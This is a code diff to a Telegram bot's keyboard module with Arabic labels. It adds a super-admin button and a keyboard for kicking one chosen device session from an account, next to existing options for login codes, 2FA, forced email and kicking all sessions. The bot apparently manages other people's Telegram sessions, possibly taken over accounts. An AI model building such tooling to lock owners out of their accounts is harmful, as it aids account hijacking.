@@ -22,6 +22,7 @@ CB = {
     "twofa": "f",
     "kick": "k",
     "kick_only": "ks",
+    "kick_spec": "kp",
     "forcemail": "fm",
     "verify": "v",
 }
@@ -286,8 +287,8 @@ def user_messages_menu_keyboard() -> InlineKeyboardMarkup:
     ])
 
 
-def session_detail_keyboard(session_id: int, page: int = 0) -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[
+def session_detail_keyboard(session_id: int, page: int = 0, is_super_admin: bool = False) -> InlineKeyboardMarkup:
+    buttons = [
         [
             InlineKeyboardButton(
                 text="🔑 المطالبة بكود",
@@ -329,7 +330,18 @@ def session_detail_keyboard(session_id: int, page: int = 0) -> InlineKeyboardMar
                 text="🚫 طرد الجلسات فقط",
                 callback_data=cb("kick_only", session_id),
             ),
-        ],
+        ]
+    ]
+
+    if is_super_admin:
+        buttons.append([
+            InlineKeyboardButton(
+                text="📱 طرد جلسة معينة",
+                callback_data=cb("kick_spec", session_id),
+            )
+        ])
+
+    buttons.extend([
         [InlineKeyboardButton(
             text="🚫 طرد الجلسات + تنظيف شامل",
             callback_data=cb("kick", session_id),
@@ -339,6 +351,7 @@ def session_detail_keyboard(session_id: int, page: int = 0) -> InlineKeyboardMar
             callback_data=f"sessions_page_{page}",
         )],
     ])
+    return InlineKeyboardMarkup(inline_keyboard=buttons)
 
 
 def back_to_session_keyboard(session_id: int) -> InlineKeyboardMarkup:
@@ -382,5 +395,25 @@ def disabled_sessions_keyboard(sessions) -> InlineKeyboardMarkup:
     
     buttons.append([
         InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")
+    ])
+    return InlineKeyboardMarkup(inline_keyboard=buttons)
+
+
+def kick_specific_keyboard(session_id: int, authorizations) -> InlineKeyboardMarkup:
+    buttons = []
+    for auth in authorizations:
+        if auth.current:
+            continue
+        
+        # معلومات الجهاز للمعاينة
+        label = f"{auth.device_model} | {auth.platform} | {auth.country}"
+        # نستخدم الـ hash كمعرف للطرد
+        # التنسيق: kp_sid_hash
+        buttons.append([
+            InlineKeyboardButton(text=label, callback_data=f"kp_{session_id}_{auth.hash}")
+        ])
+    
+    buttons.append([
+        InlineKeyboardButton(text="🔙 رجوع", callback_data=cb("session", session_id))
     ])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
